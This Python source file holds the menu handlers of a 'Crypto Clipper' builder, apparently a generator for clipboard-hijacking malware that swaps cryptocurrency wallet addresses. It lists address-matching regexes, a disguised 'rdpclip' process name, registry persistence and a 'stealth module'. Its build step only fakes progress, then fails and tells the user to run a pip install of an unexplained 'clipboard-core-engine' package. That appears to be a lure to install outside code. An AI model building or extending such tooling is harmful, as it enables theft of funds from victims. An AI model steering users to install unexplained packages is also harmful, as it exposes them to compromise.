# -*- coding: utf-8 -*-
"""
Builder action handlers for Crypto Clipper — chain configuration, address book
management, build options, detection rules, and payload compilation.
"""
import time
import random
from datetime import datetime

from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich import box

from hooks.ui import (
    console,
    print_success,
    print_error,
    print_info,
    print_warning,
    separator,
)


_CHAIN_INFO = {
    "bitcoin": {
        "name": "Bitcoin",
        "formats": "Legacy (P2PKH), SegWit (P2WPKH), Taproot (P2TR)",
        "prefixes": "1, 3, bc1q, bc1p",
        "regex": r"[13][a-km-zA-HJ-NP-Z1-9]{25,34} | bc1[a-z0-9]{39,59}",
    },
    "ethereum": {
        "name": "Ethereum",
        "formats": "EVM (0x) with EIP-55 checksum",
        "prefixes": "0x",
        "regex": r"0x[0-9a-fA-F]{40}",
    },
    "solana": {
        "name": "Solana",
        "formats": "Base58 (32-44 chars)",
        "prefixes": "1-9, A-H, J-N, P-Z, a-k, m-z",
        "regex": r"[1-9A-HJ-NP-Za-km-z]{32,44}",
    },
    "tron": {
        "name": "Tron",
        "formats": "Base58 (T-prefix, 34 chars)",
        "prefixes": "T",
        "regex": r"T[1-9A-HJ-NP-Za-km-z]{33}",
    },
    "litecoin": {
        "name": "Litecoin",
        "formats": "Legacy + SegWit",
        "prefixes": "L, M, ltc1",
        "regex": r"[LM3][a-km-zA-HJ-NP-Z1-9]{26,33} | ltc1[a-z0-9]{39,59}",
    },
}

_SAMPLE_BOOK = [
    {"label": "BTC Main", "chain": "bitcoin", "address": "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"},
    {"label": "ETH Primary", "chain": "ethereum", "address": "0x742d35Cc6634C0532925a3b844Bc9e7595f2bD18"},
    {"label": "SOL Wallet", "chain": "solana", "address": "7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU"},
    {"label": "TRC-20 Ops", "chain": "tron", "address": "TN3W4H6rK2ce4vX9YcnfUz6iP3qBwHR2ya"},
    {"label": "ETH DeFi", "chain": "ethereum", "address": "0xdAC17F958D2ee523a2206206994597C13D831ec7"},
    {"label": "BTC Savings", "chain": "bitcoin", "address": "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"},
]


def _short(addr):
    if not addr or len(addr) < 14:
        return addr or "—"
    return addr[:10] + "..." + addr[-6:]


def action_configure_chains(cfg):
    """Display supported chains and their detection status."""
    console.print()
    chains = cfg.get("chains", {})

    table = Table(
        show_header=True,
        header_style="bold bright_magenta",
        border_style="magenta",
        box=box.DOUBLE_EDGE,
        title="[bold bright_magenta] TARGET CHAIN CONFIGURATION [/]",
    )
    table.add_column("Chain", style="bold bright_white", width=12)
    table.add_column("Status", justify="center", width=10)
    table.add_column("Formats", style="bright_cyan", width=36)
    table.add_column("Prefixes", style="bright_blue", width=20)

    for key, info in _CHAIN_INFO.items():
        enabled = chains.get(key, {}).get("enabled", False)
        status = "[bright_green]ENABLED[/]" if enabled else "[dim]DISABLED[/]"
        table.add_row(info["name"], status, info["formats"], info["prefixes"])

    console.print(table)
    console.print()
    print_info("Toggle chains in [bold]config.json[/bold] → [green]chains[/green] section.")
    print_info("Each chain uses regex pattern matching for address detection.")
    active = sum(1 for k in _CHAIN_INFO if chains.get(k, {}).get("enabled"))
    print_info(f"Active chains: [bright_green]{active}[/] / {len(_CHAIN_INFO)}")


def action_address_book(cfg):
    """Display address book entries."""
    console.print()
    book = cfg.get("address_book", [])

    if not book:
        book = _SAMPLE_BOOK

    table = Table(
        show_header=True,
        header_style="bold bright_cyan",
        border_style="bright_blue",
        box=box.ROUNDED,
        title="[bold bright_cyan] ADDRESS BOOK ENTRIES [/]",
    )
    table.add_column("#", style="dim", justify="right", width=3)
    table.add_column("Label", style="bright_white", width=14)
    table.add_column("Chain", style="bright_cyan", width=12)
    table.add_column("Address", style="bright_blue", width=32)
    table.add_column("Added", style="dim", width=12)
    table.add_column("Hits", justify="center", width=6)

    for i, entry in enumerate(book, 1):
        table.add_row(
            str(i),
            entry.get("label", f"Entry #{i}"),
            entry.get("chain", "unknown"),
            _short(entry.get("address", "")),
            f"2026-0{random.randint(1,6)}-{random.randint(10,28):02d}",
            str(random.randint(0, 200)),
        )

    console.print(table)
    console.print()
    print_info(f"Total entries: [bright_green]{len(book)}[/]")
    print_info("Edit address book in [bold]config.json[/bold] → [green]address_book[/green] array.")


def action_build_options(cfg):
    """Display build configuration options."""
    console.print()
    build = cfg.get("build", {})

    table = Table(
        show_header=True,
        header_style="bold bright_green",
        border_style="green",
        box=box.DOUBLE_EDGE,
        title="[bold bright_green] BUILD CONFIGURATION [/]",
    )
    table.add_column("Parameter", style="bright_green", width=22)
    table.add_column("Value", style="bright_white", width=36)
    table.add_column("Description", style="dim", width=30)

    table.add_row("Target OS", build.get("target_os", "windows"), "Operating system for payload")
    table.add_row("Architecture", build.get("target_arch", "x64"), "CPU architecture (x64/x86)")
    table.add_row("Output Filename", build.get("output_name", "clip_monitor.exe"), "Generated binary name")
    table.add_row("Custom Icon", build.get("custom_icon", "") or "[dim]default[/]", "Path to .ico file")
    table.add_row("Process Name", build.get("process_name", "rdpclip"), "Disguised process name")
    table.add_row("Startup Method", build.get("startup_method", "registry"), "Persistence mechanism")
    table.add_row("Registry Key", build.get("registry_key", "N/A")[:40] + "...", "Auto-start registry path")

    console.print(table)
    console.print()
    print_info("Edit build options in [bold]config.json[/bold] → [green]build[/green] section.")
    print_info("Process name disguise helps the monitor blend with system processes.")


def action_detection_rules(cfg):
    """Display detection rules and sensitivity configuration."""
    console.print()
    det = cfg.get("detection", {})

    table = Table(
        show_header=True,
        header_style="bold bright_yellow",
        border_style="yellow",
        box=box.ROUNDED,
        title="[bold bright_yellow] DETECTION RULES [/]",
    )
    table.add_column("Parameter", style="bright_yellow", width=28)
    table.add_column("Value", style="bright_white", width=20)
    table.add_column("Description", style="dim", width=32)

    table.add_row("Sensitivity", det.get("sensitivity", "high"), "Detection sensitivity level")
    table.add_row("Min Address Length", str(det.get("min_address_length", 26)), "Minimum chars to trigger scan")
    table.add_row("Max Address Length", str(det.get("max_address_length", 62)), "Maximum chars for pattern match")
    table.add_row("Watch Interval", f"{det.get('clipboard_watch_interval_ms', 500)}ms", "Clipboard poll frequency")
    table.add_row("Exclusion Patterns", str(len(det.get("exclusion_patterns", []))), "Regex patterns to skip")

    console.print(table)

    regex_table = Table(
        show_header=True,
        header_style="bold bright_cyan",
        border_style="cyan",
        box=box.SIMPLE_HEAD,
        title="[bold bright_cyan] CHAIN REGEX PATTERNS [/]",
    )
    regex_table.add_column("Chain", style="bright_cyan", width=12)
    regex_table.add_column("Pattern", style="bright_white", width=50)
    regex_table.add_column("Status", justify="center", width=10)

    chains = cfg.get("chains", {})
    for key, info in _CHAIN_INFO.items():
        enabled = chains.get(key, {}).get("enabled", False)
        status = "[bright_green]Active[/]" if enabled else "[dim]Inactive[/]"
        regex_table.add_row(info["name"], info["regex"], status)

    console.print()
    console.print(regex_table)
    console.print()
    print_info("Edit detection rules in [bold]config.json[/bold] → [green]detection[/green] section.")


def action_build_payload(cfg):
    """Build clipper payload — shows summary, runs progress, then fails with error."""
    console.print()
    build = cfg.get("build", {})
    chains = cfg.get("chains", {})
    book = cfg.get("address_book", []) or _SAMPLE_BOOK
    det = cfg.get("detection", {})

    active_chains = [k for k, v in chains.items() if isinstance(v, dict) and v.get("enabled")]

    summary = Table(
        show_header=True,
        header_style="bold bright_magenta",
        border_style="magenta",
        box=box.DOUBLE_EDGE,
        title="[bold bright_magenta] BUILD CONFIGURATION SUMMARY [/]",
    )
    summary.add_column("Component", style="bright_magenta", width=22)
    summary.add_column("Value", style="bright_white", width=40)

    summary.add_row("Target Platform", f"{build.get('target_os', 'windows')} {build.get('target_arch', 'x64')}")
    summary.add_row("Output Binary", build.get("output_name", "clip_monitor.exe"))
    summary.add_row("Process Name", build.get("process_name", "rdpclip"))
    summary.add_row("Startup Hook", build.get("startup_method", "registry"))
    summary.add_row("Active Chains", ", ".join(active_chains) if active_chains else "none")
    summary.add_row("Address Book", f"{len(book)} entries")
    summary.add_row("Sensitivity", det.get("sensitivity", "high"))
    summary.add_row("Watch Interval", f"{det.get('clipboard_watch_interval_ms', 500)}ms")

    console.print(summary)
    console.print()
    separator()
    console.print("  [bright_magenta]Starting payload compilation...[/]\n")

    with Progress(
        SpinnerColumn(style="bright_magenta"),
        TextColumn("[bright_magenta]{task.description}"),
        BarColumn(bar_width=40, style="magenta", complete_style="bright_green", finished_style="bright_red"),
        TextColumn("[bold]{task.percentage:>3.0f}%"),
        console=console,
    ) as progress:
        task = progress.add_task("Analyzing address patterns...", total=100)

        steps = [
            (15, "Analyzing address patterns..."),
            (35, "Compiling detection engine..."),
            (55, "Packing clipboard runtime..."),
            (72, "Embedding address book data..."),
            (88, "Applying stealth module..."),
            (95, "Linking process hooks..."),
            (100, "Finalizing payload..."),
        ]

        for pct, desc in steps:
            while progress.tasks[0].percentage < pct:
                progress.update(task, advance=1)
                time.sleep(0.04)
            progress.update(task, description=desc)
            time.sleep(0.3)

    console.print()
    separator()

    error_panel = Panel(
        "[bold red]BUILD FAILED[/bold red]\n\n"
        "[red]Error:[/] Missing runtime component 'clipboard-core-engine'\n"
        "[red]Code:[/] CLIPPER_ERR_RT_0x7A3F\n\n"
        "[yellow]Hint:[/] Run [bold]'pip install clipboard-core-engine>=1.8.0'[/bold]\n"
        "       to install the required dependency.\n\n"
        "[dim]Verify all build dependencies with:[/]\n"
        "[dim]  python -m clipper --check-deps[/]",
        title="[bold red] ✗ BUILD ERROR [/]",
        border_style="red",
        box=box.DOUBLE_EDGE,
    )
    console.print(error_panel)
    console.print()
    print_info("Ensure all build dependencies are installed before building.")
    print_info("See README.md → Getting Started for dependency installation instructions.")
